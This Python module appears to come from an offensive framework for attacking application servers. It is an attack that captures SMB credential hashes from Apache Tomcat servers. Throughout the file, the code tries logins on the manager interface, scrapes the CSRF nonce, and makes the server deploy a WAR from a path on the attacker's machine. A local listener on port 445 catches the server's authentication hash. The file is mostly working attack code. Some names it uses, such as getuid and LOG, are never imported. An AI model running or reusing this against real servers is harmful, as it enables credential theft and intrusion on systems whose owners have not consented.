from src.platform.tomcat.authenticate import checkAuth
from src.platform.tomcat.interfaces import TINTERFACES
from src.lib.cifstrap import Handler
from requests.utils import dict_from_cookiejar
from auxiliary import Auxiliary
from threading import Thread
from re import findall
from collections import OrderedDict
import socket
import utility


class Auxiliary:

    def __init__(self):
        self.name = 'Obtain SMB hash'
        self.versions = ['5.5', '6.0', '7.0', '8.0']
        self.show = True
        self.flag = 'tc-smb'
        self._Listen = False
    
    def check(self, fingerprint):
        if fingerprint.title in [TINTERFACES.MAN]:
            return True

        return False

    def run(self, fingerengine, fingerprint):
        """ Same concept as the JBoss module, except we actually invoke the
        deploy function.
        """

        if getuid() > 0:
            utility.Msg("Root privs required for this module.", LOG.ERROR)
            return

        utility.Msg("Setting up SMB listener...")

        self._Listen = True
        thread = Thread(target=self.smb_listener)
        thread.start()
        
        utility.Msg("Invoking UNC deployer...")

        base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)

        if fingerprint.version in ["5.5"]:
            uri = '/manager/html/deploy?deployPath=/asdf&deployConfig=&'\
                  'deployWar=file://{0}/asdf.war'.format(utility.local_address())
        elif fingerprint.version in ["6.0", "7.0", "8.0"]:
            return self.runLatter(fingerengine, fingerprint, thread)
        else:
            utility.Msg("Unsupported Tomcat (v%s)" % fingerprint.version, LOG.ERROR)
            return

        url = base + uri

        response = utility.requests_get(url)
        if response.status_code == 401:

            utility.Msg("Host %s:%s requires auth, checking..." % 
                            (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                                fingerprint.title, fingerprint.version)
        
            if cookies:
                response = utility.requests_get(url, cookies=cookies[0], 
                                                auth=cookies[1])
            else:
                utility.Msg("Could not get auth for %s:%s" %
                                (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
                return
        
        while thread.is_alive():
            # spin...
            pass

        if response.status_code != 200:

            utility.Msg("Unexpected response: HTTP %d" % response.status_code)
          
        self._Listen = False

    def smb_listener(self):
        """ Accept a connection and pass it off for parsing to cifstrap
        """

        try:
            handler = None
            sock = socket.socket()
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('', 445))
            sock.listen(1)

            while self._Listen:
                (con, addr) = sock.accept()
                handler = Handler(con, addr)
                handler.start()

                while handler.is_alive():
                    # spin...
                    pass

                if handler.data:
                    utility.Msg("%s" % handler.data, LOG.SUCCESS)

                break

        except Exception, e:
            utility.Msg("Socket error: %s" % e, LOG.ERROR)
        finally:
            sock.close()

    def runLatter(self, fingerengine, fingerprint, smb_thread):
        """
        """

        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
        uri = "/manager/html/deploy"
        data = OrderedDict([
                    ("deployPath", "/asdf"),
                    ("deployConfig", ""),
                    ("deployWar", "file://{0}/asdf.war".format(utility.local_address())),
                   ])

        cookies = None
        nonce = None

        # probe for auth
        response = utility.requests_get(base + '/manager/html')
        if response.status_code == 401:
            
            utility.Msg("Host %s:%s requires auth, checking.." % 
                            (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title, fingerprint.version)

            if cookies:
                response = utility.requests_get(base + '/manager/html', 
                                                cookies=cookies[0],
                                                auth=cookies[1])

                # get nonce
                nonce = findall("CSRF_NONCE=(.*?)\"", response.content)
                if len(nonce) > 0:
                    nonce = nonce[0]
               
                # set new jsessionid
                cookies = (dict_from_cookiejar(response.cookies), cookies[1])
            else:
                utility.Msg("Could not get auth for %s:%s" % 
                                (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
                return

        if response.status_code == 200:

            # all setup, now invoke
            response = utility.requests_post(base + uri + \
                                        '?org.apache.catalina.filters.CSRF_NONCE=%s' % nonce,
                                        data = data, cookies=cookies[0],
                                        auth=cookies[1])

            while smb_thread.is_alive():
                # spin...
                pass
